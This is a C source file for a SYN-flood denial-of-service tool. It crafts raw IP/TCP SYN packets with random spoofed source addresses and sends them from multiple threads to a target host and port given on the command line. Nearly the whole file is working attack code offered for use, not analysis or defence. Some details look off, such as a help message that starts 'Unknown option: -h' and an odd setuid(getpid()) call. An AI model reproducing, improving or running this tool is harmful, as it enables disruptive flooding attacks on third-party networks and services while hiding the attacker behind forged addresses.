#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h> 
#include <arpa/inet.h>
#include <pthread.h>
#include <getopt.h>

#include "syn-flood.h"

int raw_sock = 0;
int dst_port = 0;
static int alive = -1;

char dst_ip[BUF_SIZE] = { 0 };
char arg_ip[BUF_SIZE] = { 0 };

void print_options_programm()
{
	printf("Unknown option: -h\n");
	printf("usage:\n");
	printf("\t[-a | --addr] ip address destination attack machine\n"); 
	printf("\t[-h | --help]	help\n");
    printf("\t[-p | --port]	port destination attack machine\n"); 
	printf("\t[-t | --thread] number of threads\n");
}

int set_options(int argc, char **argv)
{
	int val_thread = MAXCHILD;
	struct option opts[] = {
    	{"help", no_argument, 0, 'h'},
    	{"addr", required_argument, 0, 'a'},
    	{"port", required_argument, 0, 'p'},
    	{"thread", required_argument, 0, 't'},
    	{0, 0, 0, 0},
    };
	int c;
	while ((c = getopt(argc, argv, "ha:p:t:")) != -1) {
    	switch (c) {
			case 'a':
				strcpy(arg_ip, optarg);
				break;
      
			case 'h':
				print_options_programm();
				return 0;
      
			case 'p':
				dst_port = atoi(optarg);
				break;

			case 't':
				val_thread = atoi(optarg);
				break;

			case '?':
				if (optopt == 'c')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (isprint (optopt))
					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
				else
					fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
				return 0;
			
			default:
				abort ();
		}
	}

	return val_thread;
}

unsigned short checksum(unsigned short *ptr, int n_bytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum = 0;
    while (n_bytes > 1) {
        sum += *ptr++;
        n_bytes -= 2;
    }

    if (n_bytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }
 
    sum = (sum >> 16)+(sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
     
    return answer;
}

void init_header(ip_hdr *ip, tcp_hdr *tcp, fake_hdr *fake)
{
  int len = sizeof(ip_hdr) + sizeof(tcp_hdr);
	/* IP заполняем заголовок */
	ip->hl = (4 << 4 | sizeof(ip_hdr)/sizeof(unsigned int));
	ip->tos = 0;
	ip->total_len = htons(len);
	ip->id = 1;
	ip->frag_and_flags = 0x40;
	ip->ttl = 255;
	ip->proto = IPPROTO_TCP;
	ip->checksum = 0;
	ip->src_ip = 0;
	ip->dest_ip = inet_addr(dst_ip);

	/* ТСР заполняем заголовок */
	tcp->src_port = htons( rand()%16383 + 49152 );
	tcp->dest_port = htons(dst_port);
	tcp->seq = htonl( rand()%90000000 + 2345 ); 
	tcp->ack = 0; 
	tcp->lenres = (sizeof(tcp_hdr) / 4 << 4 | 0);
	tcp->flag = 0x02;
	tcp->win = htons (2048);  
	tcp->sum = 0;
	tcp->urp = 0;

	/* TCP псевдо заголовок */
	fake->zero = 0;
	fake->protocol = IPPROTO_TCP;
	fake->len = htons(sizeof(tcp_hdr));
	fake->dest_addr = inet_addr(dst_ip);
	srand((unsigned) time(NULL));
}

void send_ddos_packet(struct sockaddr_in *addr)
{ 
	char buf[BUF_SIZE];
	char send_buf[BUF_SIZE];
	int len;
	ip_hdr ip;
	tcp_hdr tcp;
	fake_hdr fake;

	len = sizeof(ip) + sizeof(tcp_hdr);
  
	init_header(&ip, &tcp, &fake);
  
	while(alive) {
    	ip.src_ip = rand();

    memset(buf, '\0', sizeof(buf));
    memcpy(buf , &ip, sizeof(ip));
    ip.checksum = checksum((u_short *) buf, sizeof(ip));

    fake.src_addr = ip.src_ip;

    memset(buf, '\0', sizeof(buf));
    memcpy(buf , &fake, sizeof(fake_hdr));
    memcpy(buf + sizeof(fake_hdr), &tcp, sizeof(tcp_hdr));
    tcp.sum = checksum((u_short *) buf, sizeof(fake_hdr) + sizeof(tcp_hdr));

    memset(send_buf, '\0', sizeof(send_buf));
    memcpy(send_buf, &ip, sizeof(ip));
    memcpy(send_buf + sizeof(ip), &tcp, sizeof(tcp_hdr));
    printf(".\n");

    if (sendto(raw_sock, send_buf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr)) < 0) {
      perror("sendto()");
      pthread_exit("fail");
    }

    sleep(1);
}
}

void sig_int(int signo)
{
	alive = 0;
}

int main(int argc, char *argv[])
{
	struct sockaddr_in addr;
	struct hostent * host = NULL;

	int n_pthread = set_options(argc, argv);
	if (!n_pthread)
		return 1;

	int on = 1;
	int i = 0;
	int err = -1;
	pthread_t pthread[n_pthread];
	
	alive = 1;
	/* CTRL + C */
	signal(SIGINT, sig_int);

	memset(&addr, '\0', sizeof(addr));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(dst_port);

	if (inet_addr(dst_ip) == INADDR_NONE) {
    	host = gethostbyname(arg_ip);
    	if(host == NULL) {
      		perror("gethostbyname()");
      		exit(1);
   		}
	addr.sin_addr = *((struct in_addr*)(host->h_addr));
    strncpy(dst_ip, inet_ntoa(addr.sin_addr), 16);
	} else {
    	addr.sin_addr.s_addr = inet_addr(dst_ip);
	}

	if (dst_port < 0 || dst_port > 65535) {
    	printf("Port Error\n");
    	exit(1);
	}

	printf("host ip=%s\n", inet_ntoa(addr.sin_addr));

	raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (raw_sock < 0) {
		perror("socket()");
		exit(1);
	}

	err = setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on));
	if (err < 0) {
		perror("setsockopt()");
		exit(1);
	}

	setuid(getpid());

	for(i = 0; i < n_pthread; i++) {
		err = pthread_create(&pthread[i], NULL, send_ddos_packet, &addr);
    
    	if(err != 0) {
			perror("pthread_create()");
			exit(1);
		}
	}

	for(i = 0; i < n_pthread; i++) {
    	err = pthread_join(pthread[i], NULL);
    	if(err != 0) {
			perror("pthread_join Error\n");
			exit(1);
		}
	}

	close(raw_sock);

	return 0;
}
